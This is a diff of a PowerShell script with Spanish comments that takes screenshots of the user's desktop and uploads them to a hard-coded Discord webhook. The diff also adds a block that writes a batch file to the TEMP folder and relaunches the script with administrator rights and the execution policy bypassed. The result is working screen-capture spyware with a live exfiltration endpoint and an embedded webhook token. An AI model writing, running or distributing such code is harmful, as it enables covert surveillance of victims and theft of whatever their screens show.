@@ -1,30 +1,3 @@
-# Verificar si se está ejecutando como administrador
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-
-# Si no se está ejecutando como administrador, volver a ejecutar como administrador utilizando el mismo script
-if (-not $isAdmin) {
-    # Mostrar mensaje de espera
-    Write-Host "Este script requiere permisos de administrador. Por favor, acepta la solicitud de ejecutar como administrador."
-
-    # Esperar unos segundos
-    Start-Sleep -Seconds 5
-
-    # Obtener el nombre del script actual
-    $scriptName = $MyInvocation.MyCommand.Name
-
-    # Obtener la ruta del script actual
-    $scriptPath = $MyInvocation.MyCommand.Definition
-
-    # Ejecutar el script como administrador utilizando el mismo script
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
-
-    # Salir del script actual
-    exit
-}
-
-# Definir la URL del webhook
-$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
-
 # Función para capturar y enviar la captura de pantalla al webhook
 function CaptureAndSendScreenshot {
     # Definir la ruta del archivo temporal de la captura de pantalla
@@ -47,6 +20,9 @@ function CaptureAndSendScreenshot {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile
 }
 
+# Definir la URL del webhook
+$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+
 # Definir la cantidad de capturas de pantalla a enviar
 $numberOfScreenshots = 2
 
@@ -58,3 +34,14 @@ for ($i = 1; $i -le $numberOfScreenshots; $i++) {
     CaptureAndSendScreenshot
     Start-Sleep -Seconds $intervalSeconds
 }
+
+# Obtener la ubicación del script actual
+$scriptPath = $MyInvocation.MyCommand.Path
+
+# Crear un archivo de comando por lotes (batch) para ejecutar el script como administrador
+$batchScriptPath = "$env:TEMP\RunAsAdmin.bat"
+$batchScriptContent = "@echo off`npowershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
+$batchScriptContent | Out-File -FilePath $batchScriptPath -Encoding ASCII
+
+# Ejecutar el archivo de comando por lotes como administrador
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batchScriptPath`"" -Verb RunAs
